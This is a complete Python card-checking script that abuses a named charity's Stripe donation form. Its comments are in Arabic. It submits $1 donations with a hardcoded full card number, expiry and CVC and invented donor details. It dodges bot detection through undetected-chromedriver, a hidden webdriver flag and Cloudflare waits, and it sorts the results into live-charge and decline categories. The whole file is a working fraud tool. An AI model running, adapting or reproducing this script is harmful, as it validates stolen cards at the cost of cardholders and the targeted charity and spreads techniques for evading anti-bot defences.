import time
import re
import json
import random
import os
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

URL = 'https://goodhope.org/giving/?form-id=12124&payment-mode=stripe&level-id=custom&custom-amount=1.00'
FORM_URL = 'https://goodhope.org/giving/'

STRIPE_KEY = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'

CARD_NUMBER = '5104040287872188'
EXP_MONTH = '12'
EXP_YEAR = '27'
CVC = '951'

FIRST_NAME = 'James'
LAST_NAME = 'Smith'
EMAIL = f'james{random.randint(100,999)}@gmail.com'
ADDRESS = '123 Main Street'
CITY = 'New York'
STATE = 'NY'
ZIP = '10001'
COUNTRY = 'US'


# ═══════════════════════════════════════════════════════════
# STEP 1: Get Form Data via Requests
# ═══════════════════════════════════════════════════════════

def step1_get_form():
    """جيب الصفحة واستخرج بيانات الفورم"""
    print("=" * 60)
    print("STEP 1: Opening page via Requests")
    print("=" * 60)
    
    session = requests.Session()
    session.verify = False
    
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
    }
    
    try:
        response = session.get(FORM_URL, headers=headers, timeout=20)
        
        print(f"📥 Status: {response.status_code}")
        print(f"📄 Length: {len(response.text)}")
        
        if response.status_code != 200:
            return None, f"HTTP_{response.status_code}"
        
        html = response.text
        html_lower = html.lower()
        
        if 'just a moment' in html_lower:
            return None, "CLOUDFLARE_CHALLENGE"
        
        # استخرج البيانات
        form_id = None
        form_hash = None
        form_prefix = None
        
        m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
        if m:
            form_id = m.group(1)
        
        m = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', html)
        if m:
            form_hash = m.group(1)
        
        m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
        if m:
            form_prefix = m.group(1)
        
        stripe_key = STRIPE_KEY
        m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
        if m:
            stripe_key = m.group(0)
        
        print(f"✅ Form ID: {form_id}")
        print(f"✅ Form Hash: {form_hash}")
        print(f"✅ Form Prefix: {form_prefix}")
        print(f"✅ Stripe Key: {stripe_key}")
        
        if not form_id or not form_hash:
            return None, "MISSING_FORM_DATA"
        
        return {
            'session': session,
            'form_id': form_id,
            'form_hash': form_hash,
            'form_prefix': form_prefix or f'{form_id}-1',
            'stripe_key': stripe_key,
            'cookies': dict(session.cookies),
        }, "OK"
    
    except Exception as e:
        return None, f"ERROR: {str(e)[:150]}"


# ═══════════════════════════════════════════════════════════
# STEP 2: Generate Stripe PM via Selenium
# ═══════════════════════════════════════════════════════════

def step2_generate_pm(form_data):
    """Selenium يولّد Stripe PM"""
    print("\n" + "=" * 60)
    print("STEP 2: Generating Stripe PM via Selenium")
    print("=" * 60)
    
    try:
        import undetected_chromedriver as uc
    except ImportError:
        # Fallback لـ Selenium عادي
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            from selenium.webdriver.chrome.service import Service
            
            print("⚠️ Using regular Selenium (no undetected)")
            
            options = Options()
            options.binary_location = '/usr/bin/chromium'
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--headless=new')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            
            if os.path.exists('/usr/bin/chromedriver'):
                service = Service('/usr/bin/chromedriver')
                driver = webdriver.Chrome(service=service, options=options)
            else:
                driver = webdriver.Chrome(options=options)
            
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        except Exception as e:
            return None, f"Driver error: {str(e)[:150]}"
    else:
        # undetected-chromedriver
        print("✅ Using undetected-chromedriver")
        
        options = uc.ChromeOptions()
        options.binary_location = '/usr/bin/chromium'
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--headless=new')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36')
        
        try:
            driver = uc.Chrome(
                options=options,
                driver_executable_path='/usr/bin/chromedriver',
                use_subprocess=True
            )
        except:
            driver = uc.Chrome(options=options, use_subprocess=True)
    
    # ═══ Open Page ═══
    try:
        print(f"🌐 Opening: {URL}")
        driver.get(URL)
        
        # استنى الصفحة + Stripe.js
        max_wait = 30
        start = time.time()
        
        while time.time() - start < max_wait:
            html = driver.page_source
            if 'just a moment' in html.lower():
                print(f"   ⏳ Cloudflare...")
                time.sleep(2)
                continue
            if 'stripe' in html.lower() or 'Stripe' in html:
                break
            time.sleep(1)
        
        print(f"📄 Page loaded, length: {len(driver.page_source)}")
        
        # ═══ Generate Stripe PM via JS ═══
        print("💳 Injecting Stripe.js...")
        
        stripe_js = """
        var callback = arguments[arguments.length - 1];
        var stripeKey = arguments[0];
        var cardNum = arguments[1];
        var expM = arguments[2];
        var expY = arguments[3];
        var cvc = arguments[4];
        var name = arguments[5];
        var email = arguments[6];
        
        (async () => {
            try {
                if (typeof Stripe === 'undefined') {
                    await new Promise((resolve, reject) => {
                        const s = document.createElement('script');
                        s.src = 'https://js.stripe.com/v3/';
                        s.onload = resolve;
                        s.onerror = () => reject(new Error('Stripe.js load failed'));
                        document.head.appendChild(s);
                    });
                    await new Promise(r => setTimeout(r, 2000));
                }
                
                if (typeof Stripe === 'undefined') {
                    callback(JSON.stringify({error: 'Stripe.js not available'}));
                    return;
                }
                
                const stripe = Stripe(stripeKey);
                
                const result = await stripe.createPaymentMethod({
                    type: 'card',
                    card: {
                        number: cardNum,
                        exp_month: parseInt(expM),
                        exp_year: parseInt(expY),
                        cvc: cvc
                    },
                    billing_details: {
                        name: name,
                        email: email,
                        address: {
                            line1: '123 Main Street',
                            city: 'New York',
                            state: 'NY',
                            postal_code: '10001',
                            country: 'US'
                        }
                    }
                });
                
                if (result.error) {
                    callback(JSON.stringify({
                        error: result.error.message,
                        code: result.error.code,
                        decline_code: result.error.decline_code
                    }));
                } else {
                    callback(JSON.stringify({
                        pm_id: result.paymentMethod.id,
                        success: true
                    }));
                }
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
        })();
        """
        
        try:
            driver.set_script_timeout(30)
            result_raw = driver.execute_async_script(
                stripe_js,
                form_data['stripe_key'],
                CARD_NUMBER,
                EXP_MONTH,
                EXP_YEAR,
                CVC,
                f'{FIRST_NAME} {LAST_NAME}',
                EMAIL
            )
            
            print(f"📥 Stripe JS response: {result_raw[:400]}")
            
            pm_data = json.loads(result_raw)
            
            if 'error' in pm_data:
                error = pm_data['error']
                decline = pm_data.get('decline_code', '')
                code = pm_data.get('code', '')
                
                driver.quit()
                
                if decline:
                    return None, f"STRIPE_{decline.upper()}: {error[:100]}"
                if code:
                    return None, f"STRIPE_{code.upper()}: {error[:100]}"
                return None, f"STRIPE_ERROR: {error[:100]}"
            
            pm_id = pm_data.get('pm_id')
            print(f"✅ PM ID: {pm_id}")
            
            # ═══ Get Cookies ═══
            cookies = driver.get_cookies()
            cookie_dict = {c['name']: c['value'] for c in cookies}
            print(f"✅ Got {len(cookies)} cookies")
            
            ua = driver.execute_script("return navigator.userAgent")
            
            driver.quit()
            
            return {
                'pm_id': pm_id,
                'cookies': cookie_dict,
                'user_agent': ua,
            }, "OK"
        
        except Exception as e:
            driver.quit()
            return None, f"Stripe JS error: {str(e)[:150]}"
    
    except Exception as e:
        try:
            driver.quit()
        except:
            pass
        return None, f"Selenium error: {str(e)[:150]}"


# ═══════════════════════════════════════════════════════════
# STEP 3: Submit Donation
# ═══════════════════════════════════════════════════════════

def step3_submit(form_data, pm_data):
    """أرسل POST للتبرع"""
    print("\n" + "=" * 60)
    print("STEP 3: Submitting Donation")
    print("=" * 60)
    
    # استخدم جلسة جديدة مع cookies من Selenium
    session = requests.Session()
    session.verify = False
    
    # دمج cookies
    for k, v in form_data.get('cookies', {}).items():
        session.cookies.set(k, v)
    
    for k, v in pm_data.get('cookies', {}).items():
        session.cookies.set(k, v)
    
    print(f"🍪 Total cookies: {len(session.cookies)}")
    
    # Construct POST URL
    post_url = f'https://goodhope.org/giving/?payment-mode=stripe&form-id={form_data["form_id"]}'
    
    payload = {
        'give-honeypot': '',
        'give-form-id-prefix': form_data['form_prefix'],
        'give-form-id': form_data['form_id'],
        'give-form-title': 'Give via ApplePay/Google Pay',
        'give-current-url': FORM_URL,
        'give-form-url': FORM_URL,
        'give-form-minimum': '1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': form_data['form_hash'],
        'give-price-id': 'custom',
        'give-amount': '1.00',
        'give_stripe_payment_method': pm_data['pm_id'],
        'payment-mode': 'stripe',
        'give_first': FIRST_NAME,
        'give_last': LAST_NAME,
        'give_email': EMAIL,
        'card_name': f'{FIRST_NAME} {LAST_NAME}',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
    }
    
    headers = {
        'authority': 'goodhope.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://goodhope.org',
        'referer': FORM_URL,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': pm_data.get('user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'),
    }
    
    try:
        response = session.post(post_url, data=payload, headers=headers, timeout=30)
        
        print(f"📥 Status: {response.status_code}")
        print(f"📄 Length: {len(response.text)}")
        print(f"📄 First 500: {response.text[:500]}")
        
        return parse_response(response.text, response.status_code)
    
    except Exception as e:
        return f"POST error: {str(e)[:150]}"


# ═══════════════════════════════════════════════════════════
# Parse Response
# ═══════════════════════════════════════════════════════════

def parse_response(text, status_code):
    """تحليل الرد"""
    text_lower = text.lower()
    
    # Live responses
    live_map = {
        'insufficient_funds': 'INSUFFICIENT_FUNDS',
        'insufficient funds': 'INSUFFICIENT_FUNDS',
        'your card has insufficient funds': 'INSUFFICIENT_FUNDS',
        'card was declined': 'DECLINED',
        'your card was declined': 'DECLINED',
        'expired_card': 'EXPIRED_CARD',
        'your card has expired': 'EXPIRED_CARD',
        'suspected fraud': 'SUSPECTED_FRAUD',
        'fraudulent': 'SUSPECTED_FRAUD',
        'incorrect_cvc': 'CVV_FAILURE',
        'security code is incorrect': 'CVV_FAILURE',
        'incorrect_number': 'INVALID_CARD_NUMBER',
        'card number is incorrect': 'INVALID_CARD_NUMBER',
        'do_not_honor': 'DO_NOT_HONOR',
        'processing_error': 'PROCESSING_ERROR',
        'thank you': 'CHARGE 1.0',
        'success': 'CHARGE 1.0',
        'completed': 'CHARGE 1.0',
    }
    
    for kw, resp in live_map.items():
        if kw in text_lower:
            return resp
    
    # JSON
    if text.strip().startswith('{'):
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                if data.get('success'):
                    return 'CHARGE 1.0'
                if 'data' in data and isinstance(data['data'], dict):
                    inner = data['data']
                    if 'error' in inner:
                        return f"GATEWAY: {inner['error'][:100]}"
        except:
            pass
    
    # Search error in HTML
    matches = re.findall(r'"error[^"]*"\s*:\s*"([^"]+)"', text)
    if matches:
        return f"ERROR: {matches[0][:100]}"
    
    match = re.search(r'(error[:\s]+[^<\n]{5,150})', text_lower)
    if match:
        return f"ERROR: {match.group(1)[:100]}"
    
    if status_code == 200:
        return f"UNKNOWN_200: {text[:200].strip()}"
    return f"HTTP_{status_code}"


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def run():
    print("🚀 STARTING")
    print(f"🎯 Target: {URL}")
    print(f"💳 Card: {CARD_NUMBER[:4]}...{CARD_NUMBER[-4:]}")
    print("")
    
    # Step 1
    form_data, result = step1_get_form()
    if result != "OK":
        print(f"\n❌ Failed Step 1: {result}")
        return result
    
    # Step 2
    pm_data, result = step2_generate_pm(form_data)
    if result != "OK":
        print(f"\n❌ Failed Step 2: {result}")
        return result
    
    # Step 3
    final_result = step3_submit(form_data, pm_data)
    
    print("\n" + "=" * 60)
    print(f"📊 FINAL RESULT: {final_result}")
    print("=" * 60)
    
    return final_result


if __name__ == '__main__':
    run()
